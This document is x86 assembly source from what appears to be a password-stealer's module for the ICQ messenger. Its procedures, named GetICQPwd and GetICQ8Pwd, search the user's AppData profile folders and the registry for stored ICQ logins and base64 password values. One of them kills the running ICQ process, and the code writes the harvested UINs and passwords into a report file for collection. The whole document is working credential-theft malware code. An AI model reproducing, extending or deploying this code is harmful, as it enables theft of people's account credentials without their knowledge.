     
.data?
     ICQ_AppData     db 100h dup (?)
     icq_TmpBuf1     db 200h dup (?)
     icq_base64_pwd  db 200h dup (?)
     icqfd           WIN32_FIND_DATA <>
     
.code

icq_process_file proc uses ebx
        LOCAL   pwd_pos   :DWORD
        LOCAL   req_size  :DWORD
     
        mov     dword ptr [pwd_pos], 0
        
        invoke  MapFile, addr icq_TmpBuf1, addr mfile, MAP_FILE_A
        test    eax, eax
        je      icq_nofile
        
        mov     ebx, mfile.lpMem
        
        push    mfile.dwFileSize
        lstrlenW, addr uStoredPassword
        push    eax
        push    ebx
        push    offset uStoredPassword
        call    strposU
        test    eax, eax
        je      icq_total_shit
        lea     eax, dword ptr [eax+sizeof uStoredPassword+0Ah]
        mov     dword ptr [pwd_pos], eax
        
        lstrcpyW, addr icq_base64_pwd, pwd_pos
        ;WideCharToMultiByte, CP_ACP, 0, pwd_pos, -1, 0, 0, 0, 0
        ;mov     dword ptr [req_size], eax
        ;WideCharToMultiByte, CP_ACP, 0, pwd_pos, -1, addr icq_base64_pwd, req_size, 0, 0
        
        ; Write UIN
        lstrlen, addr icqfd.cFileName
        mov     dword ptr [plen], eax
        add     dword ptr [DataSize], sizeof plen
        add     dword ptr [DataSize], eax
        WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
        mov     byte ptr [data_type], REPORT_DATA_LOGIN
        add     dword ptr [DataSize], sizeof data_type
        WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
        WriteFile, stfile, addr icqfd.cFileName, plen, addr SNW, NULL
     
        ; Write pwd hash
        lstrlenW, addr icq_base64_pwd
        imul    eax, eax, 2
        mov     dword ptr [plen], eax
        add     dword ptr [DataSize], sizeof plen
        add     dword ptr [DataSize], eax
        WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
        mov     byte ptr [data_type], REPORT_DATA_PWD
        add     dword ptr [DataSize], sizeof data_type
        WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
        WriteFile, stfile, addr icq_base64_pwd, plen, addr SNW, NULL
      icq_total_shit:
        invoke  UnmapFile, addr mfile
      icq_nofile:
        ret
icq_process_file endp

GetICQ8Pwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], ICQ8_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetICQ8Pwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    offset icq_exe
      call    KillProcessW
      
      push    offset icq8_str1
      call    GetVerTxtToLog
      test    eax, eax
      je      mra_ver_txt_get_failed
      
      push    offset icq8_reg2
      call    GrabAccountsFromRegistry
    mra_ver_txt_get_failed:
      
    GetICQ8Pwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetICQ8Pwd endp

GetICQPwd proc
      LOCAL   WTF:DWORD
      LOCAL   hFind :DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], ICQ_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetICQPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    0
      push    CSIDL_APPDATA
      push    offset ICQ_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      
      push    offset ICQ_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr ICQ_AppData, addr icq_str1
      lstrcat, addr ICQ_AppData, addr wildc
      
      FindFirstFile, addr ICQ_AppData, addr icqfd
      mov     dword ptr [hFind], eax
      cmp     eax, -1
      je      icq_fail_1
      lstrlen, addr ICQ_AppData
      mov     byte ptr [ICQ_AppData + eax - 1], 0
      jmp     icq_skip_search
    icq_search_lp:
      lstrcmp, addr icqfd.cFileName, addr fake1
      test    eax, eax
      je      icq_skip_search
      lstrcmp, addr icqfd.cFileName, addr fake2
      test    eax, eax
      je      icq_skip_search
      
      push    offset icqfd.cFileName
      push    offset ICQ_AppData
      push    offset icq_smask1
      push    offset icq_TmpBuf1
      call    wsprintf
      add     esp, 4*4
      
      call    icq_process_file
      
      push    offset icqfd.cFileName
      push    offset ICQ_AppData
      push    offset icq_smask2
      push    offset icq_TmpBuf1
      call    wsprintf
      add     esp, 4*4
      
      call    icq_process_file
      
    icq_skip_search:
      FindNextFile, hFind, addr icqfd
      test    eax, eax
      jne     icq_search_lp
      FindClose, hFind
      
    icq_fail_1:
      
    GetICQPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetICQPwd endp
